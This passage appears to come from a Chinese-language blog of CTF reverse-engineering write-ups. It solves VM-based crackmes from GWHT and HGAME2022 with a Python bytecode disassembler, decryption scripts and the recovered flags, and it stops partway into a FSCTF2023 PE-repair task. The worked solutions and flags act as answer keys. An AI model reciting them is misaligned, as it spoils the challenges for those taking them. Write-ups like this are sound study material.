class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>,-<span class="number">1</span>]</span><br><span class="line">enc = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"><span class="comment"># enc = &quot;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&quot;</span></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line">line = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mov reg2 12h&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> opcode[pc] != -<span class="number">1</span>:</span><br><span class="line">    line+=<span class="number">1</span></span><br><span class="line">    op = opcode[pc]</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0x0</span>):</span><br><span class="line">        pc+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INPUT_AND_CHECKLEN&quot;</span>)</span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF1</span>):</span><br><span class="line">        <span class="keyword">case</span> = opcode[pc+<span class="number">1</span>]</span><br><span class="line">        v2 = opcode[pc+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov reg1 input[<span class="subst">&#123;v2&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE2</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov reg2 input[<span class="subst">&#123;v2&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE3</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov reg3 input[<span class="subst">&#123;v2&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE4</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov input[<span class="subst">&#123;v2&#125;</span>] reg1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE5</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov reg4 input[<span class="subst">&#123;v2&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">case</span>==<span class="number">0xE6</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;mov input[<span class="subst">&#123;v2&#125;</span>] reg2&quot;</span>)</span><br><span class="line">        pc += <span class="number">6</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;xor reg1 reg2&quot;</span>)</span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF4</span>):</span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mul reg1 reg4&quot;</span>)</span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF8</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;swap reg1 reg2&quot;</span>) </span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0xF6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov reg1 3*reg1 + 2*reg2 + reg3&quot;</span>)</span><br><span class="line">        pc += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>打印出来:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">mov reg2 12h</span><br><span class="line">INPUT_AND_CHECKLEN</span><br><span class="line">mov reg1 input[0]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[32] reg1</span><br><span class="line">mov reg1 input[1]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[33] reg1</span><br><span class="line">mov reg1 input[2]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[34] reg1</span><br><span class="line">mov reg1 input[3]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[35] reg1</span><br><span class="line">mov reg1 input[4]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[36] reg1</span><br><span class="line">mov reg1 input[5]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[37] reg1</span><br><span class="line">mov reg1 input[6]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[38] reg1</span><br><span class="line">mov reg1 input[7]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[39] reg1</span><br><span class="line">mov reg1 input[8]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[40] reg1</span><br><span class="line">mov reg1 input[9]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[41] reg1</span><br><span class="line">mov reg1 input[10]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[42] reg1</span><br><span class="line">mov reg1 input[11]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[43] reg1</span><br><span class="line">mov reg1 input[12]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[44] reg1</span><br><span class="line">mov reg1 input[13]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[45] reg1</span><br><span class="line">mov reg1 input[14]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[46] reg1</span><br><span class="line">mov reg1 input[15]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[47] reg1</span><br><span class="line">mov reg1 input[16]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[48] reg1</span><br><span class="line">mov reg1 input[17]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[49] reg1</span><br><span class="line">mov reg1 input[18]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[50] reg1</span><br><span class="line">mov reg1 input[19]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[51] reg1</span><br><span class="line">INPUT_AND_CHECKLEN</span><br><span class="line">mov reg1 input[0]</span><br><span class="line">mov reg2 input[1]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[0] reg1</span><br><span class="line">mov reg1 input[1]</span><br><span class="line">mov reg2 input[2]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[1] reg1</span><br><span class="line">mov reg1 input[2]</span><br><span class="line">mov reg2 input[3]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[2] reg1</span><br><span class="line">mov reg1 input[3]</span><br><span class="line">mov reg2 input[4]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[3] reg1</span><br><span class="line">mov reg1 input[4]</span><br><span class="line">mov reg2 input[5]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[4] reg1</span><br><span class="line">mov reg1 input[5]</span><br><span class="line">mov reg2 input[6]</span><br><span class="line">xor reg1 reg2</span><br><span class="line">mov input[5] reg1</span><br><span class="line">mov reg1 input[6]</span><br><span class="line">mov reg2 input[7]</span><br><span class="line">mov reg3 input[8]</span><br><span class="line">mov reg4 input[12]</span><br><span class="line">mov reg1 3*reg1 + 2*reg2 + reg3</span><br><span class="line">mul reg1 reg4</span><br><span class="line">mov input[6] reg1</span><br><span class="line">mov reg1 input[7]</span><br><span class="line">mov reg2 input[8]</span><br><span class="line">mov reg3 input[9]</span><br><span class="line">mov reg4 input[12]</span><br><span class="line">mov reg1 3*reg1 + 2*reg2 + reg3</span><br><span class="line">mul reg1 reg4</span><br><span class="line">mov input[7] reg1</span><br><span class="line">mov reg1 input[8]</span><br><span class="line">mov reg2 input[9]</span><br><span class="line">mov reg3 input[10]</span><br><span class="line">mov reg4 input[12]</span><br><span class="line">mov reg1 3*reg1 + 2*reg2 + reg3</span><br><span class="line">mul reg1 reg4</span><br><span class="line">mov input[8] reg1</span><br><span class="line">mov reg1 input[13]</span><br><span class="line">mov reg2 input[19]</span><br><span class="line">swap reg1 reg2</span><br><span class="line">mov input[13] reg1</span><br><span class="line">mov reg1 input[14]</span><br><span class="line">mov reg2 input[18]</span><br><span class="line">swap reg1 reg2</span><br><span class="line">mov input[14] reg1</span><br><span class="line">mov reg1 input[15]</span><br><span class="line">mov reg2 input[17]</span><br><span class="line">swap reg1 reg2</span><br><span class="line">mov input[15] reg1</span><br></pre></td></tr></table></figure><p>可以清晰看到有两次input<br>第一遍逆向出来是假的flag</p><p>第二遍逐步分析:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input[0] = input[0]^input[1]</span><br><span class="line">input[1] = input[1]^input[2]</span><br><span class="line">input[2] = input[2]^input[3]</span><br><span class="line">input[3] = input[3]^input[4]</span><br><span class="line">input[4] = input[4]^input[5]</span><br><span class="line">input[5] = input[5]^input[6]</span><br><span class="line">input[6] = (3*input[6]+2*input[7]+input[8])*input[12]</span><br><span class="line">input[7] = (3*input[7]+2*input[8]+input[9])*input[12]</span><br><span class="line">input[8] = (3*input[8]+2*input[9]+input[10])*input[12]</span><br><span class="line">input[13] = input[19]  swap?</span><br><span class="line">input[14] = input[18]</span><br><span class="line">input[15] = input[17]</span><br></pre></td></tr></table></figure><p>这里就可以发现swap那个函数应该是带着指针的 bytecode有一点小问题 但不是很影响做题<br>这样的话我们就从后开始逆<br>先swap 然后发现input[12]&#x2F;input[9]&#x2F;input[10]是没有改变的 所以可以爆破得到input[8] 从而得到7,6<br>这样就可以xor回去得到5,4,3,2,1,0<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] START&quot;</span>)</span><br><span class="line">    enc[<span class="number">13</span>],enc[<span class="number">19</span>] = enc[<span class="number">19</span>],enc[<span class="number">13</span>]</span><br><span class="line">    enc[<span class="number">14</span>],enc[<span class="number">18</span>] = enc[<span class="number">18</span>],enc[<span class="number">14</span>]</span><br><span class="line">    enc[<span class="number">15</span>],enc[<span class="number">17</span>] = enc[<span class="number">17</span>],enc[<span class="number">15</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        y = <span class="number">3</span>*x+<span class="number">2</span>*enc[<span class="number">9</span>]+enc[<span class="number">10</span>]</span><br><span class="line">        y *= enc[<span class="number">12</span>]</span><br><span class="line">        y &amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span>(y==enc[<span class="number">8</span>]):</span><br><span class="line">            enc[<span class="number">8</span>] = x</span><br><span class="line">            <span class="built_in">print</span>(enc[<span class="number">8</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        y = <span class="number">3</span>*x+<span class="number">2</span>*enc[<span class="number">8</span>]+enc[<span class="number">9</span>]</span><br><span class="line">        y *= enc[<span class="number">12</span>]</span><br><span class="line">        y &amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span>(y==enc[<span class="number">7</span>]):</span><br><span class="line">            enc[<span class="number">7</span>] = x</span><br><span class="line">            <span class="built_in">print</span>(enc[<span class="number">7</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        y = <span class="number">3</span>*x+<span class="number">2</span>*enc[<span class="number">7</span>]+enc[<span class="number">8</span>]</span><br><span class="line">        y *= enc[<span class="number">12</span>]</span><br><span class="line">        y &amp;= <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span>(y==enc[<span class="number">6</span>]):</span><br><span class="line">            enc[<span class="number">6</span>]=x</span><br><span class="line">            <span class="built_in">print</span>(enc[<span class="number">6</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        enc[i] ^= enc[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">dec()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Y0u_hav3_r3v3rs3_1t!</span></span><br></pre></td></tr></table></figure><p><strong>GWHT{Y0u_hav3_r3v3rs3_1t!}</strong></p><hr><hr><p>这题是最基本的vm类型 还没加jump跳转指令<br>关键在于分析opcode和对应的操作数以及每个函数抽象出的意义</p><h1 id="HGAME2022"><a href="#HGAME2022" class="headerlink" title="HGAME2022"></a>HGAME2022</h1><h2 id="week4-ezvm"><a href="#week4-ezvm" class="headerlink" title="week4 ezvm"></a>week4 ezvm</h2><p>这道vm很怪 特别怪…<br>直接解析指令很离谱… 各种寄存器&#x2F;堆栈&#x2F;xor_key&#x2F;enc交织在一起 真的分析不明白<br>大概打印一下 可以发现关键加密两个点<br>mul 2<br>xor xxx<br>字节码上这两个是挨着的 猜测就是乘2再xor<br>直接动调看(注意getchar那里要一次行输完…)<br>发现确实乘2 后紧跟着就是 xor<br>每次xor的不一样 可以动调记录 也可以找几个后在dword_49F020数组找对应项<br>得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor_key = [<span class="number">0x0000005E</span>, <span class="number">0x00000046</span>, <span class="number">0x00000061</span>, <span class="number">0x00000043</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000053</span>, <span class="number">0x00000049</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000051</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000036</span>, <span class="number">0x00000037</span>, <span class="number">0x00000029</span>, <span class="number">0x00000041</span>, <span class="number">0x00000063</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000064</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000015</span>, <span class="number">0x00000018</span>, <span class="number">0x0000005B</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000022</span>, <span class="number">0x00000050</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000035</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000043</span>, <span class="number">0x00000023</span>, <span class="number">0x00000060</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000000</span>]</span><br></pre></td></tr></table></figure><p>同样的 enc数组也可以在dword_49F020里面翻 应该也可以等变换完了步过来找<br>这里记录一下<br>首先通过xor_key知道flag位数 然后等32次变换完后 发现原本存储输入的变成了加密后的<br>那么在数组第一个点下硬件断点 等触发<br>发现在这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_401904</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_49F030++;</span><br><span class="line">  result = ++dword_49F024;</span><br><span class="line">  dword_49F020[dword_49F024 + <span class="number">9</span>] = dword_49F020[v0 + <span class="number">209</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时可以根据v0的值找到dword_49F020数组中的位置 也就能找到enc[]了</p><p>得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x0000008E</span>, <span class="number">0x00000088</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000099</span>, <span class="number">0x000000C4</span>, <span class="number">0x000000A5</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000DD</span>, <span class="number">0x00000019</span>, <span class="number">0x000000EC</span>, <span class="number">0x0000006C</span>, <span class="number">0x0000009B</span>, <span class="number">0x000000F3</span>, <span class="number">0x0000001B</span>, <span class="number">0x0000008B</span>, <span class="number">0x0000005B</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000009B</span>, <span class="number">0x000000F1</span>, <span class="number">0x00000086</span>, <span class="number">0x000000F3</span>, <span class="number">0x000000F4</span>, <span class="number">0x000000A4</span>, <span class="number">0x000000F8</span>, <span class="number">0x000000F8</span>, <span class="number">0x00000098</span>, <span class="number">0x000000AB</span>, <span class="number">0x00000086</span>, <span class="number">0x00000089</span>, <span class="number">0x00000061</span>, <span class="number">0x00000022</span>, <span class="number">0x000000C1</span>, <span class="number">0x00000002</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逆向解密得到flag<br><strong>hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!}</strong></p><hr><hr><p>还是希望能够打印出正确的字节码来看 但是网上就找不到一篇这么做的…  等以后再来补吧~<br>也行吧 vm最初的方法就是动调… 这种不好解析汇编指令的动调也不失为一种好方法</p><h1 id="FSCTF2023"><a href="#FSCTF2023" class="headerlink" title="FSCTF2023"></a>FSCTF2023</h1><h2 id="ezbroke"><a href="#ezbroke" class="headerlink" title="ezbroke"></a>ezbroke</h2><p>PE修复+vm<br>vm很简单 重点是PE修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> Offset    0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   Ascii</span><br><span class="line"></span><br><span class="line">00000000  54 47 